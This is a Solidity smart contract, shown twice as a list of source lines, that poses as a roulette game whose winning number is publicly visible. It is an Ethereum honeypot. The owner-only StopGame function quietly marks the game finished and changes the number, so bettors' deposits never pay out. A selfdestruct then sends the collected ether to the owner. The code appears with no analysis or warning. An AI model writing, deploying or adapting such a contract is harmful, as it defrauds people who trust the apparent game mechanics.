['pragma solidity ^0.4.20;\n', '\n', 'contract R\n', '{\n', '\n', '    uint8 public result = 0;\n', '\n', '    bool finished = false;\n', '\n', '    address rouletteOwner;\n', '\n', '    function Play(uint8 _number)\n', '    external\n', '    payable\n', '    {\n', '        require(msg.sender == tx.origin);\n', '        if(result == _number && msg.value>0.1 ether && !finished)\n', '        {\n', '            msg.sender.transfer(this.balance);\n', '            GiftHasBeenSent();\n', '        }\n', '    }\n', '\n', '    function StartRoulette(uint8 _number)\n', '    public\n', '    payable\n', '    {\n', '        if(result==0)\n', '        {\n', '            result = _number;\n', '            rouletteOwner = msg.sender;\n', '        }\n', '    }\n', '\n', '    function StopGame(uint8 _number)\n', '    public\n', '    payable\n', '    {\n', '        require(msg.sender == rouletteOwner);\n', '        GiftHasBeenSent();\n', '        result = _number;\n', '        if (msg.value>0.08 ether){\n', '            selfdestruct(rouletteOwner);\n', '        }\n', '    }\n', '\n', '    function GiftHasBeenSent()\n', '    private\n', '    {\n', '        finished = true;\n', '    }\n', '\n', '    function() public payable{}\n', '}']
['pragma solidity ^0.4.20;\n', '\n', 'contract R\n', '{\n', '\n', '    uint8 public result = 0;\n', '\n', '    bool finished = false;\n', '\n', '    address rouletteOwner;\n', '\n', '    function Play(uint8 _number)\n', '    external\n', '    payable\n', '    {\n', '        require(msg.sender == tx.origin);\n', '        if(result == _number && msg.value>0.1 ether && !finished)\n', '        {\n', '            msg.sender.transfer(this.balance);\n', '            GiftHasBeenSent();\n', '        }\n', '    }\n', '\n', '    function StartRoulette(uint8 _number)\n', '    public\n', '    payable\n', '    {\n', '        if(result==0)\n', '        {\n', '            result = _number;\n', '            rouletteOwner = msg.sender;\n', '        }\n', '    }\n', '\n', '    function StopGame(uint8 _number)\n', '    public\n', '    payable\n', '    {\n', '        require(msg.sender == rouletteOwner);\n', '        GiftHasBeenSent();\n', '        result = _number;\n', '        if (msg.value>0.08 ether){\n', '            selfdestruct(rouletteOwner);\n', '        }\n', '    }\n', '\n', '    function GiftHasBeenSent()\n', '    private\n', '    {\n', '        finished = true;\n', '    }\n', '\n', '    function() public payable{}\n', '}']
